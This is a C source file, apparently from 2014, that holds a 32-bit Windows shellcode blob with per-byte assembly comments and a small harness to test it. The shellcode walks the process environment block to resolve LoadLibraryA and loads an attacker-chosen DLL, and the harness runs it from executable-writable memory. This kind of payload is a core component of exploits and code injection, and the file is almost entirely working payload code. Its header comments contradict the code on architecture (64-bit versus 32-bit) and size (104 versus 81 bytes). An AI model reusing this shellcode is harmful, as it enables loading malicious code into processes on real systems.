
#include <windows.h>
#include <stdio.h>

//
// 104 bytes LoadLibraryA code for windows 64
//
// Copyright (c) 2014 Kevin Devine
//
// cl load64_test.cpp
//

/* Copyright (c) 2014 Kevin Devine */
/* Size = 81 bytes */

char load32[] = {
  /* 0000 */  "\x60"                          /*  pushad                             */
  /* 0001 */  "\xEB\x49"                      /*  jmp 0000004Ch                      */
  /* 0003 */  "\x6A\x30"                      /*  push 00000030h                     */
  /* 0005 */  "\x59"                          /*  pop ecx                            */
  /* 0006 */  "\x64\x8B\x31"                  /*  mov esi, dword ptr fs:[ecx]        */
  /* 0009 */  "\x8B\x76\x0C"                  /*  mov esi, dword ptr [esi+0Ch]       */
  /* 000C */  "\x8B\x76\x0C"                  /*  mov esi, dword ptr [esi+0Ch]       */
  /* 000F */  "\xAD"                          /*  lodsd                              */
  /* 0010 */  "\x8B\x30"                      /*  mov esi, dword ptr [eax]           */
  /* 0012 */  "\x8B\x6E\x18"                  /*  mov ebp, dword ptr [esi+18h]       */
  /* 0015 */  "\x8B\x45\x3C"                  /*  mov eax, dword ptr [ebp+3Ch]       */
  /* 0018 */  "\x8B\x44\x28\x78"              /*  mov eax, dword ptr [eax+ebp+78h]   */
  /* 001C */  "\x8D\x74\x28\x1C"              /*  lea esi, dword ptr [eax+ebp+1Ch]   */
  /* 0020 */  "\xB1\x03"                      /*  mov cl, 03h                        */
  /* 0022 */  "\xAD"                          /*  lodsd                              */
  /* 0023 */  "\x03\xC5"                      /*  add eax, ebp                       */
  /* 0025 */  "\x50"                          /*  push eax                           */
  /* 0026 */  "\xE2\xFA"                      /*  loop 00000022h                     */
  /* 0028 */  "\x5F"                          /*  pop edi                            */
  /* 0029 */  "\x5E"                          /*  pop esi                            */
  /* 002A */  "\x5B"                          /*  pop ebx                            */
  /* 002B */  "\x0F\xB7\x14\x4F"              /*  movzx edx, word ptr [edi+ecx*2]    */
  /* 002F */  "\x41"                          /*  inc ecx                            */
  /* 0030 */  "\xAD"                          /*  lodsd                              */
  /* 0031 */  "\x81\x3C\x28\x4C\x6F\x61\x64"  /*  cmp dword ptr [eax+ebp], 64616F4Ch */
  /* 0038 */  "\x75\xF1"                      /*  jne 0000002Bh                      */
  /* 003A */  "\x80\x7C\x28\x0B\x41"          /*  cmp byte ptr [eax+ebp+0Bh], 41h    */
  /* 003F */  "\x75\xEA"                      /*  jne 0000002Bh                      */
  /* 0041 */  "\x03\x2C\x93"                  /*  add ebp, dword ptr [ebx+edx*4]     */
  /* 0044 */  "\xFF\xD5"                      /*  call ebp                           */
  /* 0046 */  "\x89\x44\x24\x1C"              /*  mov dword ptr [esp+1Ch], eax       */
  /* 004A */  "\x61"                          /*  popad                              */
  /* 004B */  "\xC3"                          /*  ret                                */
  /* 004C */  "\xE8\xB2\xFF\xFF\xFF"          /*  call 00000003h                     */
};

int main (int argc, char* argv[]) {
  
  puts ("\nCopyright (c) 2014 Kevin Devine\n");
  
  if (argc != 2) {
    printf ("\nUsage: load32_test <DLL name/path>");
    printf ("\nExample: load32_test ws2_32\n");
    return 0;
  }
  
  char *path = argv[1];
  size_t path_len = strlen (path);
  
  if (path_len > MAX_PATH) {
    printf ("\nPath exceeds MAX_PATH limit of %i bytes", MAX_PATH);
    return 0;
  }
  
  void *exec = VirtualAlloc(0, strlen (load32) + MAX_PATH, 
    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy (exec, load32, strlen (load32));
  strcat ((char*)exec, path);
  printf ("\nAssembly : %i\nFinal Size : %i", 
    strlen (load32), 
    path_len + strlen (load32));
  //DebugBreak();
  printf ("\nBase Address returned : 0x%08lX\n", ((DWORD(*)())exec)());
  
  VirtualFree (exec, 0, MEM_RELEASE);
  return 0;
}

